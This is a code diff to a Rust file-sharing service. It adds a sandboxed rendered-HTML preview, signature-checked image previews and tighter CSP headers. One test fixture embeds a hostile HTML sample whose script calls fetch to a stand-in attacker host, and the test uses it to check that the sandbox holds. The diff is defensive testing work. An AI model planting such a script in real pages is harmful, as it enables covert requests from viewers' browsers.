@@ -1,10 +1,12 @@
-//! Bounded, inert previews of untrusted files.
+//! Bounded previews of untrusted files.
 //!
 //! This module deliberately does not turn uploaded Markdown or HTML into active
 //! markup. Text, code, and Markdown are returned as JSON strings. The dedicated
-//! HTML-source response uses `text/plain`, so even a new-tab navigation cannot
-//! execute the file. A CSP sandbox and defense-in-depth response headers remain
-//! attached to every preview response.
+//! HTML source remains available as `text/plain`. Rendered HTML is isolated in
+//! a browser sandbox and served under a deny-by-default CSP. Image responses
+//! are accepted only after their signatures match a supported media type.
+
+use std::io::{Read, Seek as _, SeekFrom};
 
 use axum::{
     Json, Router,
@@ -15,6 +17,8 @@ use axum::{
     routing::get,
 };
 use serde::{Deserialize, Serialize};
+use tokio::io::AsyncReadExt as _;
+use tokio_util::io::ReaderStream;
 
 use crate::{
     app::AppState,
@@ -29,9 +33,12 @@ use crate::{
 /// preview to allocate an unbounded buffer. Operators may configure any lower
 /// value.
 pub const HARD_MAX_PREVIEW_BYTES: u64 = 16 * 1024 * 1024;
+const IMAGE_HEADER_BYTES: u64 = 64 * 1024;
+const MAX_IMAGE_PIXELS: u64 = 100_000_000;
+const IMAGE_STREAM_CHUNK_BYTES: usize = 64 * 1024;
 
-const PREVIEW_CSP: &str =
-    "sandbox; default-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'self'";
+const PREVIEW_CSP: &str = "sandbox; default-src 'none'; style-src 'unsafe-inline'; img-src data:; \
+    base-uri 'none'; form-action 'none'; frame-ancestors 'self'; navigate-to 'none'";
 const PERMISSIONS_POLICY: &str = "accelerometer=(), autoplay=(), camera=(), display-capture=(), \
     encrypted-media=(), fullscreen=(), geolocation=(), gyroscope=(), hid=(), identity-credentials-get=(), \
     idle-detection=(), local-fonts=(), magnetometer=(), microphone=(), midi=(), payment=(), \
@@ -43,6 +50,7 @@ const PERMISSIONS_POLICY: &str = "accelerometer=(), autoplay=(), camera=(), disp
 pub enum PreviewKind {
     Code,
     HtmlSource,
+    Image,
     MarkdownSource,
     Text,
 }
@@ -53,6 +61,12 @@ pub struct PreviewDocument {
     pub kind: PreviewKind,
     pub source: String,
     pub language: Option<&'static str>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub mime_type: Option<&'static str>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub width: Option<u32>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub height: Option<u32>,
     pub size: u64,
     /// V1 rejects oversized files rather than returning ambiguous partial text.
     pub truncated: bool,
@@ -226,6 +240,11 @@ pub fn router() -> Router<AppState> {
     Router::new()
         .route("/shares/{share_id}/preview", get(preview_json))
         .route("/shares/{share_id}/preview/html", get(preview_html_source))
+        .route(
+            "/shares/{share_id}/preview/html/rendered",
+            get(preview_html_rendered),
+        )
+        .route("/shares/{share_id}/preview/image", get(preview_image))
 }
 
 async fn preview_json(
@@ -246,6 +265,53 @@ async fn preview_html_source(
 ) -> Result<Response, PreviewRequestError> {
     let document = request_document(&state, &identity, &raw_share_id, query.path.as_deref())?;
     html_source_response(document).map_err(Into::into)
+}
+
+async fn preview_html_rendered(
+    State(state): State<AppState>,
+    identity: AuthenticatedIdentity,
+    Path(raw_share_id): Path<String>,
+    Query(query): Query<PreviewQuery>,
+) -> Result<Response, PreviewRequestError> {
+    let document = request_document(&state, &identity, &raw_share_id, query.path.as_deref())?;
+    html_rendered_response(document).map_err(Into::into)
+}
+
+async fn preview_image(
+    State(state): State<AppState>,
+    identity: AuthenticatedIdentity,
+    Path(raw_share_id): Path<String>,
+    Query(query): Query<PreviewQuery>,
+) -> Result<Response, PreviewRequestError> {
+    let share_id = ShareId::new(raw_share_id).map_err(|_| AppError::NotFound)?;
+    let raw_path = query.path.as_deref().ok_or(PreviewError::InvalidPath)?;
+    let path = VirtualPath::parse(raw_path).map_err(|error| PreviewError::from(error.code()))?;
+    let authorized = state.browse().authorize(&identity, &share_id)?;
+    let opened = authorized
+        .open_file(&path)
+        .map_err(|error| PreviewError::from(error.code()))?;
+    let size = opened.len();
+    if size > state.preview_policy().max_bytes() {
+        return Err(PreviewError::TooLarge.into());
+    }
+    let mut file = opened.into_std();
+    let mut header = Vec::with_capacity(size.min(IMAGE_HEADER_BYTES) as usize);
+    Read::by_ref(&mut file)
+        .take(IMAGE_HEADER_BYTES)
+        .read_to_end(&mut header)
+        .map_err(|_| PreviewError::Unavailable)?;
+    let image = validated_image(&header)?;
+    file.seek(SeekFrom::Start(0))
+        .map_err(|_| PreviewError::Unavailable)?;
+    let stream = ReaderStream::with_capacity(
+        tokio::fs::File::from_std(file).take(size),
+        IMAGE_STREAM_CHUNK_BYTES,
+    );
+    Ok(image_response(
+        Body::from_stream(stream),
+        image.mime_type,
+        size,
+    ))
 }
 
 fn request_document(
@@ -271,10 +337,42 @@ pub fn load(
     path: &VirtualPath,
     policy: PreviewPolicy,
 ) -> Result<PreviewDocument, PreviewError> {
-    let bytes = share
-        .read_file(path, policy.max_bytes())
+    let opened = share
+        .open_file(path)
         .map_err(|error| PreviewError::from(error.code()))?;
-    let size = bytes.len() as u64;
+    let size = opened.len();
+    if size > policy.max_bytes() {
+        return Err(PreviewError::TooLarge);
+    }
+    let mut file = opened.into_std();
+    let mut header = Vec::with_capacity(size.min(IMAGE_HEADER_BYTES) as usize);
+    Read::by_ref(&mut file)
+        .take(IMAGE_HEADER_BYTES)
+        .read_to_end(&mut header)
+        .map_err(|_| PreviewError::Unavailable)?;
+    if let Some(image) = classify_image(&header) {
+        validate_image_dimensions(image)?;
+        return Ok(PreviewDocument {
+            kind: PreviewKind::Image,
+            source: String::new(),
+            language: None,
+            mime_type: Some(image.mime_type),
+            width: image.width,
+            height: image.height,
+            size,
+            truncated: false,
+        });
+    }
+    file.seek(SeekFrom::Start(0))
+        .map_err(|_| PreviewError::Unavailable)?;
+    let mut bytes = Vec::with_capacity(size as usize);
+    Read::by_ref(&mut file)
+        .take(policy.max_bytes().saturating_add(1))
+        .read_to_end(&mut bytes)
+        .map_err(|_| PreviewError::Unavailable)?;
+    if bytes.len() as u64 > policy.max_bytes() {
+        return Err(PreviewError::TooLarge);
+    }
     let source = String::from_utf8(bytes).map_err(|_| PreviewError::InvalidUtf8)?;
     if contains_binary_control(&source) {
         return Err(PreviewError::Binary);
@@ -284,6 +382,9 @@ pub fn load(
         kind,
         source,
         language,
+        mime_type: None,
+        width: None,
+        height: None,
         size,
         truncated: false,
     })
@@ -324,6 +425,140 @@ pub fn html_source_response(document: PreviewDocument) -> Result<Response, Previ
     );
     apply_security_headers(headers);
     Ok(response)
+}
+
+/// Returns uploaded HTML as a document that can only render inside the UI's
+/// doubly-sandboxed iframe. The CSP forbids scripts, forms, navigation,
+/// same-origin access, network requests, plugins, and storage capabilities.
+pub fn html_rendered_response(document: PreviewDocument) -> Result<Response, PreviewError> {
+    if document.kind != PreviewKind::HtmlSource {
+        return Err(PreviewError::UnsupportedEntry);
+    }
+    let mut response = Response::new(Body::from(document.source));
+    let headers = response.headers_mut();
+    headers.insert(
+        header::CONTENT_TYPE,
+        HeaderValue::from_static("text/html; charset=utf-8"),
+    );
+    headers.insert(
+        header::CONTENT_DISPOSITION,
+        HeaderValue::from_static("inline"),
+    );
+    apply_security_headers(headers);
+    Ok(response)
+}
+
+fn image_response(body: Body, mime_type: &'static str, size: u64) -> Response {
+    let mut response = Response::new(body);
+    let headers = response.headers_mut();
+    headers.insert(header::CONTENT_TYPE, HeaderValue::from_static(mime_type));
+    headers.insert(
+        header::CONTENT_DISPOSITION,
+        HeaderValue::from_static("inline"),
+    );
+    if let Ok(value) = HeaderValue::from_str(&size.to_string()) {
+        headers.insert(header::CONTENT_LENGTH, value);
+    }
+    apply_security_headers(headers);
+    response
+}
+
+#[derive(Clone, Copy, Debug, Eq, PartialEq)]
+struct ImageInfo {
+    mime_type: &'static str,
+    width: Option<u32>,
+    height: Option<u32>,
+}
+
+fn classify_image(bytes: &[u8]) -> Option<ImageInfo> {
+    if bytes.starts_with(b"\x89PNG\r\n\x1a\n") && bytes.len() >= 24 {
+        let width = u32::from_be_bytes(bytes[16..20].try_into().ok()?);
+        let height = u32::from_be_bytes(bytes[20..24].try_into().ok()?);
+        if width == 0 || height == 0 {
+            return None;
+        }
+        return Some(ImageInfo {
+            mime_type: "image/png",
+            width: Some(width),
+            height: Some(height),
+        });
+    }
+    if (bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a")) && bytes.len() >= 10 {
+        return Some(ImageInfo {
+            mime_type: "image/gif",
+            width: Some(u16::from_le_bytes(bytes[6..8].try_into().ok()?) as u32),
+            height: Some(u16::from_le_bytes(bytes[8..10].try_into().ok()?) as u32),
+        });
+    }
+    if bytes.starts_with(&[0xff, 0xd8, 0xff]) {
+        let mut offset = 2;
+        while offset + 9 < bytes.len() {
+            if bytes[offset] != 0xff {
+                offset += 1;
+                continue;
+            }
+            let marker = bytes[offset + 1];
+            if matches!(marker, 0xc0..=0xc3 | 0xc5..=0xc7 | 0xc9..=0xcb | 0xcd..=0xcf) {
+                return Some(ImageInfo {
+                    mime_type: "image/jpeg",
+                    height: Some(u16::from_be_bytes([bytes[offset + 5], bytes[offset + 6]]) as u32),
+                    width: Some(u16::from_be_bytes([bytes[offset + 7], bytes[offset + 8]]) as u32),
+                });
+            }
+            if marker == 0xd9 || marker == 0xda {
+                break;
+            }
+            let length = u16::from_be_bytes([bytes[offset + 2], bytes[offset + 3]]) as usize;
+            if length < 2 {
+                break;
+            }
+            offset = offset.saturating_add(length + 2);
+        }
+        return Some(ImageInfo {
+            mime_type: "image/jpeg",
+            width: None,
+            height: None,
+        });
+    }
+    if bytes.len() >= 12 && bytes.starts_with(b"RIFF") && &bytes[8..12] == b"WEBP" {
+        let (width, height) = if bytes.len() >= 30 && &bytes[12..16] == b"VP8X" {
+            (
+                Some(1 + u32::from_le_bytes([bytes[24], bytes[25], bytes[26], 0])),
+                Some(1 + u32::from_le_bytes([bytes[27], bytes[28], bytes[29], 0])),
+            )
+        } else {
+            (None, None)
+        };
+        return Some(ImageInfo {
+            mime_type: "image/webp",
+            width,
+            height,
+        });
+    }
+    if bytes.len() >= 12 && &bytes[4..8] == b"ftyp" && bytes[8..12].starts_with(b"avif") {
+        return Some(ImageInfo {
+            mime_type: "image/avif",
+            width: None,
+            height: None,
+        });
+    }
+    None
+}
+
+fn validated_image(bytes: &[u8]) -> Result<ImageInfo, PreviewError> {
+    let image = classify_image(bytes).ok_or(PreviewError::UnsupportedEntry)?;
+    validate_image_dimensions(image)?;
+    Ok(image)
+}
+
+fn validate_image_dimensions(image: ImageInfo) -> Result<(), PreviewError> {
+    if let (Some(width), Some(height)) = (image.width, image.height) {
+        let pixels = u64::from(width).saturating_mul(u64::from(height));
+        if width == 0 || height == 0 || pixels > MAX_IMAGE_PIXELS {
+            return Err(PreviewError::UnsupportedEntry);
+        }
+    }
+    Ok(())
 }
 
 fn apply_security_headers(headers: &mut HeaderMap) {
@@ -462,6 +697,10 @@ mod tests {
         .unwrap();
         fs::write(temporary.path().join("large.txt"), vec![b'a'; 128]).unwrap();
         fs::write(temporary.path().join("binary.txt"), b"text\0binary").unwrap();
+        let mut png = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR".to_vec();
+        png.extend_from_slice(&2_u32.to_be_bytes());
+        png.extend_from_slice(&3_u32.to_be_bytes());
+        fs::write(temporary.path().join("pixel.png"), png).unwrap();
 
         let share_id = ShareId::new("documents").unwrap();
         let filesystem = ShareFs::open(share_id.clone(), temporary.path()).unwrap();
@@ -621,12 +860,92 @@ mod tests {
         assert_eq!(body.as_ref(), hostile.as_bytes());
     }
 
+    #[tokio::test]
+    async fn rendered_html_is_doubly_sandboxed_and_network_dark() {
+        let hostile =
+            "<style>body{color:red}</style><script>fetch('https://attacker.invalid')</script>";
+        let (_temporary, share, grant, path) = fixture(hostile.as_bytes(), "attack.html");
+        let authorized = share
+            .authorize(Some(&grant), GlobalPolicy::default())
+            .expect("authorized");
+        let document = load(&authorized, &path, PreviewPolicy::new(4096).unwrap()).unwrap();
+        let response = html_rendered_response(document).expect("rendered response");
+        assert_eq!(
+            response.headers().get(header::CONTENT_TYPE).unwrap(),
+            "text/html; charset=utf-8"
+        );
+        let csp = response
+            .headers()
+            .get(header::CONTENT_SECURITY_POLICY)
+            .unwrap()
+            .to_str()
+            .unwrap();
+        assert!(csp.starts_with("sandbox; default-src 'none'"));
+        assert!(csp.contains("form-action 'none'"));
+        assert!(csp.contains("navigate-to 'none'"));
+        let body = to_bytes(response.into_body(), 4096).await.unwrap();
+        assert_eq!(body.as_ref(), hostile.as_bytes());
+    }
+
+    #[tokio::test]
+    async fn raster_images_are_signature_validated_and_served_with_fixed_types() {
+        let fixture = api_fixture(4096);
+        let metadata = send(
+            &fixture.app,
+            Some(&fixture.identity),
+            Request::get("/api/v1/shares/documents/preview?path=pixel.png")
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(metadata.status(), StatusCode::OK);
+        let document = response_json(metadata).await;
+        assert_eq!(document["kind"], "image");
+        assert_eq!(document["mimeType"], "image/png");
+        assert_eq!(document["width"], 2);
+        assert_eq!(document["height"], 3);
+
+        let image = send(
+            &fixture.app,
+            Some(&fixture.identity),
+            Request::get("/api/v1/shares/documents/preview/image?path=pixel.png")
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(image.status(), StatusCode::OK);
+        assert_eq!(
+            image.headers().get(header::CONTENT_TYPE).unwrap(),
+            "image/png"
+        );
+        assert_eq!(
+            image.headers().get(header::X_CONTENT_TYPE_OPTIONS).unwrap(),
+            "nosniff"
+        );
+        assert_eq!(image.headers().get(header::CONTENT_LENGTH).unwrap(), "24");
+        assert_eq!(
+            to_bytes(image.into_body(), 4096).await.unwrap().as_ref(),
+            b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\0\x02\0\0\0\x03"
+        );
+    }
+
+    #[test]
+    fn raster_dimensions_are_bounded_before_browser_decode() {
+        let mut png = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR".to_vec();
+        png.extend_from_slice(&20_000_u32.to_be_bytes());
+        png.extend_from_slice(&20_000_u32.to_be_bytes());
+        assert_eq!(validated_image(&png), Err(PreviewError::UnsupportedEntry));
+    }
+
     #[test]
     fn html_endpoint_rejects_non_html_files() {
         let document = PreviewDocument {
             kind: PreviewKind::Text,
             source: "plain".into(),
             language: None,
+            mime_type: None,
+            width: None,
+            height: None,
             size: 5,
             truncated: false,
         };
